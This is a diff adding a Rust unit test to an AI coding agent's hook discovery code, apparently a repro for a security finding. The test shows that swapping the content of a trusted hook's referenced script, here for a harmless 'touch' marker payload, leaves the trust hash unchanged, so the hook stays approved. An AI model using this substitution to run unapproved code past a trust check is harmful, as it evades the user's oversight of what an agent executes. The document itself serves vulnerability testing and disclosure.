@@ -1,0 +1,70 @@
+diff --git a/codex-rs/hooks/src/engine/discovery.rs b/codex-rs/hooks/src/engine/discovery.rs
+index 2c730a8a09..1de5618a5f 100644
+--- a/codex-rs/hooks/src/engine/discovery.rs
++++ b/codex-rs/hooks/src/engine/discovery.rs
+@@ -1089,6 +1089,65 @@ mod tests {
+         (handlers.remove(0), entries.remove(0), warnings)
+     }
+ 
++    // hunma #1 repro: hook trust hash excludes the referenced script's content.
++    #[test]
++    fn hook_trust_survives_target_script_content_substitution() {
++        let dir = tempfile::tempdir().unwrap();
++        let script = dir.path().join("check.sh");
++        std::fs::write(&script, "#!/bin/sh\necho benign\n").unwrap();
++
++        let command = format!("sh {}", script.display());
++        let current_hash_for = |command: &str| -> String {
++            let source_path = source_path();
++            let hook_states = std::collections::HashMap::new();
++            let mut handlers = Vec::new();
++            let mut entries = Vec::new();
++            let mut warnings = Vec::new();
++            let mut display_order = 0;
++            let group = MatcherGroup {
++                matcher: None,
++                hooks: vec![HookHandlerConfig::Command {
++                    command: command.to_string(),
++                    command_windows: None,
++                    timeout_sec: None,
++                    r#async: false,
++                    status_message: None,
++                    additional_context_limit: None,
++                }],
++            };
++            append_matcher_groups(
++                &mut handlers,
++                &mut entries,
++                &mut warnings,
++                &mut display_order,
++                &mut hook_handler_source(&source_path, &hook_states),
++                HookEventName::PreToolUse,
++                vec![group],
++            );
++            entries.remove(0).current_hash
++        };
++
++        let hash_before = current_hash_for(&command);
++
++        // Attacker swaps ONLY the referenced script's content; hook definition unchanged.
++        std::fs::write(&script, "#!/bin/sh\ntouch /tmp/HOOK_TARGET_SUBSTITUTION_PWNED\n").unwrap();
++        let hash_after = current_hash_for(&command);
++
++        assert_eq!(
++            hash_before, hash_after,
++            "trust hash changed after target-script content swap; #1 would be mitigated"
++        );
++
++        // A previously-approved hook (trusted_hash = hash_before) stays Trusted after swap.
++        let status =
++            super::hook_trust_status(false, &hash_after, Some(&hash_before));
++        assert_eq!(
++            status,
++            HookTrustStatus::Trusted,
++            "swapped-script hook must remain Trusted for #1 to hold"
++        );
++    }
++
+     #[test]
+     fn supported_events_retain_per_handler_additional_context_limit_and_hash_it() {
+         for event_name in [
